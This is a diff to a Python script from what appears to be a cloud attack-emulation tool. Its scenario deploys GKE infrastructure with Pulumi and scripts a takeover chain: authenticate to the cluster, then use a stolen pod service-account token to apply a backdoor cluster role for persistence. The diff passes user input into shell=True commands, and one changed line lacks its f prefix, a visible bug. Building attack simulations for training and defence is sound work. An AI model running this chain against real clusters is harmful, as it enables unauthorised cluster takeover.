@@ -14,24 +14,24 @@ def scenario_3_execute():
     print("-"*30)
     print(colored("Executing Scenraio 3 : Compromising a web app living inside a GKE Pod, access pod secret, escalate privilege, take over the cluster", color="red"))
 
-    PROJECT_ID = os.getenv('PROJECT_ID')
-
+    PROJECT_ID = input("Enter GCP Project ID: ")
+    print(PROJECT_ID)
     print(colored("Rolling out Infra", color="red"))
     loading_animation()
     print("-"*30)
 
-    subprocess.call("cd scenarios/scenario_3/infra/ && pulumi config set gcp:project $PROJECT_ID", shell=True)
-    file_path = "./core/gcp-scenario-1-output.json"
+    subprocess.call("cd scenarios/scenario_3/infra/ && pulumi config set gcp:project {PROJECT_ID}", shell=True)
+    file_path = "./core/cobra-scenario-3-output.json"
     if os.path.exists(file_path):
         os.remove(file_path)
         print("File '{}' found and deleted.".format(file_path))
     else:
         print("File '{}' not found.".format(file_path))
 
-    subprocess.call("cd ./scenarios/scenario_3/infra/ && pulumi up -s gcp-scenario-1 -y", shell=True)
-    subprocess.call("cd ./scenarios/scenario_3/infra/ && pulumi stack -s gcp-scenario-1 output --json >> ../../../core/gcp-scenario-1-output.json", shell=True)
+    subprocess.call("cd ./scenarios/scenario_3/infra/ && pulumi up -s cobra-scenario-3 -y", shell=True)
+    subprocess.call("cd ./scenarios/scenario_3/infra/ && pulumi stack -s cobra-scenario-3 output --json >> ../../../core/cobra-scenario-3-output.json", shell=True)
 
-    with open("./core/gcp-scenario-1-output.json", "r") as file:
+    with open("./core/cobra-scenario-3-output.json", "r") as file:
         data = json.load(file)
 
     CLUSTER_NAME = data["cluster-name"]
@@ -40,7 +40,7 @@ def scenario_3_execute():
 
     print(colored("Authenticate to the cluster", color="red"))
     loading_animation()
-    subprocess.call("gcloud container clusters get-credentials "+CLUSTER_NAME+" --region us-central1 --project "+PROJECT_ID+"", shell=True)
+    subprocess.call(f"gcloud container clusters get-credentials {CLUSTER_NAME} --region us-central1 --project {PROJECT_ID}", shell=True)
 
     print(colored("Deploying Web App and service", color="red"))
     loading_animation()
@@ -77,19 +77,4 @@ def scenario_3_execute():
     print(colored("Creating a backdoor cluster role to persist", color="red"))
     loading_animation()
     print("-"*30)
-    print(CLUSTER_ENDPOINT)
-
     subprocess.call(f"kubectl --server=https://{CLUSTER_ENDPOINT} --token={pod_sa_token} apply -f scenarios/scenario_3/infra/app/backdoor.yml", shell=True)
-
-
-
-
-
-
-
-
-
-
-    
-
-
